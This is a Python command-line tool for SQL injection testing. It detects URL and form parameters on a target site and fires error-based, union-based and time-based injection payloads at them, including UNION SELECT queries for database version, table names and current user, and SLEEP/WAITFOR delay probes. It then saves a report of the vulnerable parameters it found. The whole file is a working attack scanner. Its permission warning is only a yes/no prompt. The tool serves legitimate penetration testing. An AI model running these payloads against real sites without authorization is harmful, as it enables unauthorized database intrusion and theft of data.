#!/usr/bin/env python3
"""
Specialized SQL Injection Testing Tool
Tests for various SQL injection vulnerabilities
"""

import requests
import urllib3
from urllib.parse import urljoin, quote_plus
import argparse
import time
from colorama import init, Fore, Style
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()
init(autoreset=True)

class SQLInjectionTester:
    def __init__(self, target_url, cookie=None, delay=1):
        self.target_url = target_url
        self.session = requests.Session()
        self.delay = delay
        if cookie:
            self.session.headers.update({'Cookie': cookie})
        
        # Payload categories
        self.payloads = {
            'error_based': [
                ("'", "Basic quote test"),
                ("' OR '1'='1", "Boolean true"),
                ("' OR '1'='1' --", "Boolean with comment"),
                ("' UNION SELECT NULL--", "Union with NULL"),
                ("' AND SLEEP(5)--", "Time-based (MySQL)"),
                ("'; WAITFOR DELAY '00:00:05'--", "Time-based (MSSQL)"),
                ("' AND pg_sleep(5)--", "Time-based (PostgreSQL)")
            ],
            'union_based': [
                ("' UNION SELECT 1,2,3--", "Union 3 columns"),
                ("' UNION SELECT 1,2,3,4--", "Union 4 columns"),
                ("' UNION SELECT 1,2,3,4,5--", "Union 5 columns"),
                ("' UNION SELECT @@version,2,3--", "Get version"),
                ("' UNION SELECT table_name,2,3 FROM information_schema.tables--", "Get tables")
            ],
            'blind_based': [
                ("' AND 1=1--", "Blind true"),
                ("' AND 1=2--", "Blind false"),
                ("' AND SUBSTRING(@@version,1,1)='5'--", "Version check")
            ]
        }
        
        self.results = {
            'vulnerable_parameters': [],
            'database_info': {},
            'tables_found': [],
            'error_messages': []
        }
        
    def detect_parameters(self):
        """Auto-detect parameters to test"""
        print(f"{Fore.BLUE}[*] Detecting parameters...{Style.RESET_ALL}")
        
        parameters = []
        
        # Check URL parameters
        if '?' in self.target_url:
            params = self.target_url.split('?')[1].split('&')
            for param in params:
                if '=' in param:
                    name = param.split('=')[0]
                    parameters.append({
                        'name': name,
                        'location': 'url',
                        'original_value': param.split('=')[1]
                    })
        
        # Check forms
        try:
            response = self.session.get(self.target_url, verify=False)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                for input_field in form.find_all(['input', 'textarea']):
                    name = input_field.get('name')
                    if name:
                        parameters.append({
                            'name': name,
                            'location': 'form',
                            'form_action': form.get('action', ''),
                            'form_method': form.get('method', 'get')
                        })
        except:
            pass
            
        return parameters
    
    def test_error_based(self, url, param_name, param_value, location='url'):
        """Test for error-based SQL injection"""
        payloads_tested = []
        
        for payload, description in self.payloads['error_based']:
            try:
                if location == 'url':
                    test_url = url.replace(f"{param_name}={param_value}", 
                                          f"{param_name}={quote_plus(payload)}")
                    response = self.session.get(test_url, verify=False, timeout=10)
                else:
                    # Form testing
                    data = {param_name: payload}
                    response = self.session.post(url, data=data, verify=False, timeout=10)
                
                # Check for database errors
                error_patterns = [
                    (r"SQL syntax.*MySQL", "MySQL"),
                    (r"Warning.*mysql_.*", "MySQL"),
                    (r"Unclosed quotation mark.*SQL Server", "MSSQL"),
                    (r"Microsoft OLE DB.*SQL Server", "MSSQL"),
                    (r"PostgreSQL.*ERROR", "PostgreSQL"),
                    (r"Warning.*\Wpg_\w+", "PostgreSQL"),
                    (r"ORA-[0-9]{5}", "Oracle"),
                    (r"SQLite\/", "SQLite")
                ]
                
                for pattern, db_type in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        result = {
                            'parameter': param_name,
                            'payload': payload,
                            'database': db_type,
                            'description': description,
                            'evidence': re.search(pattern, response.text).group(0)
                        }
                        self.results['vulnerable_parameters'].append(result)
                        print(f"{Fore.RED}[!] SQL Injection found: {param_name} - {db_type}{Style.RESET_ALL}")
                        print(f"    Payload: {payload}")
                        print(f"    Evidence: {result['evidence']}")
                        break
                        
                time.sleep(self.delay)  # Be gentle with the server
                
            except Exception as e:
                print(f"{Fore.YELLOW}[-] Error testing {param_name}: {str(e)}{Style.RESET_ALL}")
                
        return payloads_tested
    
    def test_time_based(self, url, param_name, param_value):
        """Specialized time-based blind SQL injection"""
        print(f"{Fore.BLUE}[*] Testing time-based injection on {param_name}{Style.RESET_ALL}")
        
        time_payloads = [
            ("' OR SLEEP(5)--", 5, "MySQL time-based"),
            ("'; WAITFOR DELAY '00:00:05'--", 5, "MSSQL time-based"),
            ("' OR pg_sleep(5)--", 5, "PostgreSQL time-based"),
            ("' AND 1=IF(2>1,SLEEP(5),0)--", 5, "MySQL conditional"),
            ("' OR 1=1 AND SLEEP(5)--", 5, "MySQL AND condition")
        ]
        
        # Baseline request
        start = time.time()
        self.session.get(url, verify=False)
        baseline = time.time() - start
        
        for payload, sleep_time, description in time_payloads:
            try:
                test_url = url.replace(f"{param_name}={param_value}", 
                                      f"{param_name}={quote_plus(payload)}")
                
                start = time.time()
                self.session.get(test_url, verify=False, timeout=sleep_time + 5)
                elapsed = time.time() - start
                
                if elapsed >= sleep_time:
                    result = {
                        'parameter': param_name,
                        'payload': payload,
                        'type': 'time_based',
                        'description': description,
                        'response_time': round(elapsed, 2)
                    }
                    self.results['vulnerable_parameters'].append(result)
                    print(f"{Fore.RED}[!] Time-based injection found: {param_name}")
                    print(f"    Response time: {elapsed:.2f}s (expected {sleep_time}s){Style.RESET_ALL}")
                    
            except Exception as e:
                continue
                
    def extract_database_info(self, vulnerable_param):
        """Attempt to extract database information"""
        print(f"{Fore.BLUE}[*] Attempting to extract database info...{Style.RESET_ALL}")
        
        info_payloads = {
            'version': [
                ("' UNION SELECT @@version,2,3--", "MySQL version"),
                ("' UNION SELECT version(),2,3--", "PostgreSQL version"),
                ("' UNION SELECT banner FROM v$version--", "Oracle version")
            ],
            'current_user': [
                ("' UNION SELECT user(),2,3--", "Current user"),
                ("' UNION SELECT current_user,2,3--", "Current user (PG)")
            ],
            'database_name': [
                ("' UNION SELECT database(),2,3--", "Database name"),
                ("' UNION SELECT db_name(),2,3--", "Database name (MSSQL)")
            ]
        }
        
        # Implementation for data extraction would go here
        
    def generate_report(self):
        """Generate detailed report"""
        report = f"""
{'='*60}
SQL INJECTION TEST REPORT
{'='*60}

Target: {self.target_url}
Test Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

VULNERABLE PARAMETERS FOUND: {len(self.results['vulnerable_parameters'])}

"""
        for i, vuln in enumerate(self.results['vulnerable_parameters'], 1):
            report += f"""
[{i}] Parameter: {vuln['parameter']}
    Type: {vuln.get('type', 'error_based')}
    Database: {vuln.get('database', 'Unknown')}
    Payload: {vuln['payload']}
    Evidence: {vuln.get('evidence', 'N/A')}
"""
        
        report += f"\n{'='*60}\n"
        
        # Save report
        filename = f"sql_injection_report_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(report)
        
        print(f"{Fore.GREEN}[+] Report saved to: {filename}{Style.RESET_ALL}")
        return report
    
    def run(self):
        print(f"{Fore.CYAN}SQL Injection Tester - Specialized Tool{Style.RESET_ALL}")
        print(f"{'='*60}\n")
        
        parameters = self.detect_parameters()
        
        if not parameters:
            print(f"{Fore.YELLOW}[!] No parameters found to test{Style.RESET_ALL}")
            return
            
        print(f"{Fore.GREEN}[+] Found {len(parameters)} parameters to test{Style.RESET_ALL}\n")
        
        for param in parameters:
            print(f"{Fore.CYAN}Testing parameter: {param['name']}{Style.RESET_ALL}")
            
            if param['location'] == 'url':
                self.test_error_based(self.target_url, param['name'], param['original_value'])
                self.test_time_based(self.target_url, param['name'], param['original_value'])
            else:
                # Handle form testing
                form_url = urljoin(self.target_url, param.get('form_action', ''))
                self.test_error_based(form_url, param['name'], '', 'form')
                
            print()
            
        self.generate_report()

def main():
    parser = argparse.ArgumentParser(description='Specialized SQL Injection Tester')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('--cookie', help='Session cookie for authenticated testing')
    parser.add_argument('--delay', type=float, default=1, help='Delay between requests (seconds)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    
    args = parser.parse_args()
    
    print(f"{Fore.RED}WARNING: Only use on systems you own or have permission to test!{Style.RESET_ALL}")
    confirm = input("Do you have permission to test this target? (yes/no): ")
    
    if confirm.lower() == 'yes':
        tester = SQLInjectionTester(args.url, args.cookie, args.delay)
        tester.run()
    else:
        print("Test cancelled.")

if __name__ == "__main__":
    main()
